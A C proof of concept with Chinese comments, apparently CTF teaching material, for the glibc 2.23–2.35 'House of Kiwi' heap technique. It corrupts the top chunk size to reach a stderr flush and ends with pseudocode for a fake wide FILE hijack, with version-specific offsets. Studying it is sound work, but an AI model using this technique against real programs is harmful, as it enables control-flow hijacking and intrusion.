#define _GNU_SOURCE
/*
 * House of Kiwi 专属触发器：glibc 2.23～2.35。
 *
 * Kiwi 的独特部分不是某一种 fake FILE 最终触发点，而是故意破坏 top chunk，
 * 让 sysmalloc 的断言进入：
 *
 *   __malloc_assert -> __fxprintf(NULL, ...) -> fflush(stderr)
 *
 * 本 PoC 用 fopencookie 的真实 write callback 观察 stderr flush，并在回调中
 * `_exit(0)`。合法 cookie API 不是漏洞；题目中应把这里替换为被覆盖的
 * stderr 与 Apple/codecvt/obstack 等 FSOP 最终触发点。
 *
 * glibc 2.36 的 __malloc_assert 改为 __libc_message 后不再访问 stderr；
 * 同一程序会 abort 而不会进入 callback，是可直接观察的失效边界。
 */

#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static ssize_t kiwi_stderr_write(void *cookie, const char *buffer, size_t size)
{
    (void)cookie;
    (void)buffer;
    (void)size;

    /* 只有旧 __malloc_assert 把缓冲的报错文本 fflush 到 cookie 时到这里。 */
    static const char ok[] =
        "[+] __malloc_assert -> fflush(stderr) callback reached\n";
    write(STDOUT_FILENO, ok, sizeof(ok) - 1);
    _exit(0);
}

int main(void)
{
    setbuf(stdout, NULL);

    cookie_io_functions_t io = {
        .read = NULL,
        .write = kiwi_stderr_write,
        .seek = NULL,
        .close = NULL,
    };
    FILE *cookie_stderr = fopencookie(NULL, "w", io);
    assert(cookie_stderr != NULL);

    /* 使用显式大缓冲，确保短断言文本先留在 FILE 内，随后由源码中的
       `fflush(stderr)` 消费；避免 write callback 在 vfprintf 中提前发生。 */
    static char stderr_buffer[0x1000];
    assert(setvbuf(cookie_stderr, stderr_buffer, _IOFBF,
                   sizeof(stderr_buffer)) == 0);
    stderr = cookie_stderr;

    void *chunk = malloc(0x100);
    assert(chunk != NULL);
    size_t usable = malloc_usable_size(chunk);

    /* `chunk + usable` 恰好落在相邻 top chunk 的 size 字段。0x21 保留
       PREV_INUSE 且达到 MINSIZE，但伪造的 old_end 不满足 page alignment，
       下一次 sysmalloc 会触发源码中的 top invariant 断言。 */
    size_t *top_size = (size_t *)((char *)chunk + usable);
    printf("[i] top.size=%#lx→0x21，触发断言\n",
           (unsigned long)*top_size);
    *top_size = 0x21;

    (void)malloc(0x1000);

    /* 若 malloc 意外返回，或者 2.36+ 没有回调却没有 abort，都不能算成功。 */
    _exit(1);
}

/*
 * ======================== stderr wide FILE 伪代码 ========================
 *
 * 上面的 C 路径只验证 Kiwi 专属触发器：损坏 top 后，2.23～2.35 的
 * `__malloc_assert` 会刷新 stderr。题目还需把 stderr 改成可消费的 wide FILE：
 *
 *     wide_vtable_field =
 *         0x130；     // glibc 2.23～2.29 使用这个偏移
 *         0x0f0；     // glibc 2.30 使用这个偏移
 *         0x0e0；     // glibc 2.31～2.35 使用这个偏移
 *
 *     fake_file[0x20] = 0；
 *     fake_file[0x28] = 1；
 *     fake_file[0x88] = 可写锁；
 *     fake_file[0xa0] = fake_wide_data；
 *     fake_file[0xc0] = 0；
 *     fake_file[0xd8] = _IO_wfile_jumps；
 *     fake_wide_data[0x18] = 0；
 *     fake_wide_data[0x30] = 0；
 *     fake_wide_data[wide_vtable_field] = fake_wide_vtable；
 *     fake_wide_vtable[0x68] = 受控 doallocate；
 *
 * 最后再破坏 top，触发本文件验证的 assert 路径。glibc 2.36 起 assert 改走
 * `__libc_message`，即使 fake FILE 布局仍正确，也不会由 Kiwi 触发它。
 */
